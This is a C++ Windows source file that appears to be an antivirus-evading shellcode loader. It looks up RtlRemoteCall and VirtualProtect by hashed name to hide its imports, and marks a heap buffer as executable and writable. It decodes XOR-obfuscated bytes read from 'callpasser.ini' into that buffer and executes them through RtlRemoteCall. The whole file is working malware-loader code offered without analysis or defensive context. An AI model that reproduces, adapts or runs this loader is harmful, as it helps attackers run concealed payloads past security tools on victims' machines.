//#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup" )
#define _CRT_SECURE_NO_WARNINGS
#include<iostream>
#include<Windows.h>
#include<winternl.h>
#include<fstream>
#include<sstream>
#include<vector>
using namespace std;

#define Get16Bits(d) ((((UINT32)(((CONST UINT8*)(d))[1])) << 8) +(UINT32)(((CONST UINT8*)(d))[0]))
typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

BOOL RtlLoadPeHeaders(_Inout_ PIMAGE_DOS_HEADER* Dos, _Inout_ PIMAGE_NT_HEADERS* Nt, _Inout_ PIMAGE_FILE_HEADER* File, _Inout_ PIMAGE_OPTIONAL_HEADER* Optional, _Inout_ PBYTE* ImageBase);

SIZE_T StringLength(_In_ LPCSTR String)
{
	LPCSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

UINT32 HashStringSuperFastHashA(_In_ LPCSTR String)
{
	INT Length = (INT)StringLength(String);
	UINT32 Hash = Length;
	INT Tmp = 0;

	INT Rem = Length & 3;
	Length >>= 2;

	for (; Length > 0; Length--)
	{
		Hash += Get16Bits(String);
		Tmp = (Get16Bits(String + 2) << 11) ^ Hash;
		Hash = (Hash << 16) ^ Tmp;
#pragma warning( push )
#pragma warning( disable : 6305)
		String += 2 * sizeof(UINT16);
#pragma warning( pop ) 
		Hash += Hash >> 11;
	}

	switch (Rem)
	{
	case 3:
	{
		Hash += Get16Bits(String);
		Hash ^= Hash << 16;
		Hash ^= ((UCHAR)String[sizeof(UINT16)]) << 18;
		Hash += Hash >> 11;
		break;
	}
	case 2:
	{
		Hash += Get16Bits(String);
		Hash ^= Hash << 11;
		Hash ^= Hash >> 17;
		break;
	}
	case 1:
	{
		Hash += (UCHAR)*String;
		Hash ^= Hash << 10;
		Hash += Hash >> 1;
	}
	}

	Hash ^= Hash << 3;
	Hash += Hash >> 5;
	Hash ^= Hash << 4;
	Hash += Hash >> 17;
	Hash ^= Hash << 25;
	Hash += Hash >> 6;

	return Hash;
}

INT StringCompareA(_In_ LPCSTR String1, _In_ LPCSTR String2)
{
	for (; *String1 == *String2; String1++, String2++)
	{
		if (*String1 == '\0')
			return 0;
	}

	return ((*(LPCSTR)String1 < *(LPCSTR)String2) ? -1 : +1);
}

DWORD64 LdrLoadGetProcedureAddress(VOID)
{
	PBYTE pFunctionName = NULL;
	PIMAGE_DOS_HEADER Dos = NULL;
	PIMAGE_NT_HEADERS Nt = NULL;
	PIMAGE_FILE_HEADER File = NULL;
	PIMAGE_OPTIONAL_HEADER Optional = NULL;
	HMODULE hModule = NULL;

	hModule = GetModuleHandleA("ntdll.dll");
	if (hModule == NULL)
		return 0;

	RtlLoadPeHeaders(&Dos, &Nt, &File, &Optional, (PBYTE*)&hModule);

	IMAGE_EXPORT_DIRECTORY* ExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)hModule + Optional->DataDirectory[0].VirtualAddress);
	PDWORD FunctionNameAddressArray = (PDWORD)((LPBYTE)(DWORD64)hModule + ExportTable->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)((LPBYTE)(DWORD64)hModule + ExportTable->AddressOfFunctions);
	PWORD FunctionOrdinalAddressArray = (PWORD)((LPBYTE)(DWORD64)hModule + ExportTable->AddressOfNameOrdinals);

	for (DWORD dwX = 0; dwX < ExportTable->NumberOfNames; dwX++)
	{
		pFunctionName = FunctionNameAddressArray[dwX] + (PBYTE)hModule;

		if (StringCompareA((PCHAR)pFunctionName, "LdrGetProcedureAddress") == 0)
			return ((DWORD64)hModule + FunctionAddressArray[FunctionOrdinalAddressArray[dwX]]);
	}

	return 0;
}

BOOL RtlLoadPeHeaders(_Inout_ PIMAGE_DOS_HEADER* Dos, _Inout_ PIMAGE_NT_HEADERS* Nt, _Inout_ PIMAGE_FILE_HEADER* File, _Inout_ PIMAGE_OPTIONAL_HEADER* Optional, _Inout_ PBYTE* ImageBase)
{
	*Dos = (PIMAGE_DOS_HEADER)*ImageBase;
	if ((*Dos)->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	*Nt = (PIMAGE_NT_HEADERS)((PBYTE)*Dos + (*Dos)->e_lfanew);
	if ((*Nt)->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	*File = (PIMAGE_FILE_HEADER)(*ImageBase + (*Dos)->e_lfanew + sizeof(DWORD));
	*Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*File + sizeof(IMAGE_FILE_HEADER));

	return TRUE;
}

typedef NTSTATUS(NTAPI* LDRGETPROCEDUREADDRESS)(HMODULE, PANSI_STRING, WORD, PVOID);

DWORD64 __stdcall GetProcAddressSuperFastHash(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash)
{
	PBYTE pFunctionName = NULL;
	PIMAGE_DOS_HEADER Dos = NULL;
	PIMAGE_NT_HEADERS Nt = NULL;
	PIMAGE_FILE_HEADER File = NULL;
	PIMAGE_OPTIONAL_HEADER Optional = NULL;
	LDRGETPROCEDUREADDRESS LdrGetProcedureAddress = NULL;
	DWORD64 FunctionAddress = ERROR_SUCCESS;
	ANSI_STRING ForwardFunctionString = { 0 };

	LdrGetProcedureAddress = (LDRGETPROCEDUREADDRESS)LdrLoadGetProcedureAddress();

	RtlLoadPeHeaders(&Dos, &Nt, &File, &Optional, (PBYTE*)&ModuleBase);

	IMAGE_EXPORT_DIRECTORY* ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + Optional->DataDirectory[0].VirtualAddress);
	PDWORD FunctionNameAddressArray = (PDWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfFunctions);
	PWORD FunctionOrdinalAddressArray = (PWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfNameOrdinals);

	for (DWORD dwX = 0; dwX < ExportTable->NumberOfNames; dwX++)
	{
		pFunctionName = FunctionNameAddressArray[dwX] + (PBYTE)ModuleBase;

		DWORD dwFunctionHash = HashStringSuperFastHashA((PCHAR)pFunctionName);
		if (Hash == dwFunctionHash)
		{
			FunctionAddress = (DWORD64)ModuleBase + FunctionAddressArray[FunctionOrdinalAddressArray[dwX]];
			if (FunctionAddress >= (ModuleBase + Optional->DataDirectory[0].VirtualAddress) &&
				FunctionAddress < (ModuleBase + Optional->DataDirectory[0].VirtualAddress) + (ModuleBase + Optional->DataDirectory[0].Size))
			{
				ForwardFunctionString.Buffer = (PCHAR)pFunctionName;
				ForwardFunctionString.Length = (USHORT)StringLength((PCHAR)pFunctionName);
				ForwardFunctionString.MaximumLength = ForwardFunctionString.Length + sizeof(CHAR);

				if (LdrGetProcedureAddress((HMODULE)ModuleBase, &ForwardFunctionString, 0, &FunctionAddress) != ((NTSTATUS)0))
					return 0;
			}

			return FunctionAddress;
		}
	}

	return 0;
}


int main(int argc, char* argv[]){

	typedef NTSTATUS (NTAPI * RtlRemoteCall_)(
		HANDLE Hprocess,
		HANDLE Hthread,
		PVOID CallSite,
		ULONG Argument,
		PULONG_PTR Arguments,
		BOOLEAN PassContext,
		BOOLEAN AlreadySusoended
	);

	typedef BOOL(WINAPI* VT)(
		LPVOID Addr,
		SIZE_T dwsize,
		DWORD New,
		PDWORD Old
		);

	HMODULE hdll = LoadLibraryA("ntdll.dll");
	HMODULE hkernel = GetModuleHandleA("Kernel32.dll");
	RtlRemoteCall_ RtlRemoteCall = (RtlRemoteCall_)GetProcAddressSuperFastHash(
		(DWORD64)hdll,
		142150472
	);

	VT VirtualProtect_ = (VT)GetProcAddressSuperFastHash(
		(DWORD)hkernel, 2577962837
	);
	
	DWORD o;
	IMalloc* PIMalloc = NULL;
	CoGetMalloc(MEMCTX_TASK, &PIMalloc);
	unsigned char* buf = (unsigned char*)PIMalloc->Alloc(1600);
	VirtualProtect_(buf, PIMalloc->GetSize(buf), 1088^1024, &o);
	char path[MAX_PATH];
	char abc[100];
	GetCurrentDirectoryA(MAX_PATH, path);
	strcat(path, "\\callpasser.ini");
	//cout << path << endl;
	for (int i = 0; i < 1600; i++) {
		
		_itoa(i, abc, 10);
		UINT num = GetPrivateProfileIntA(
			"key", abc, 0, path
		);
		if (num == 0) { break; }

		buf[i] = (unsigned char)(num ^ 1024);

	}
	RtlRemoteCall(GetCurrentProcess(), GetCurrentThread(), buf, 0, 0, 0, 1);
	//cout <<
	//	HashStringSuperFastHashA("RtlRemoteCall") << endl
	//	<< HashStringSuperFastHashA("VirtualProtect") << endl;

	return 0;
}
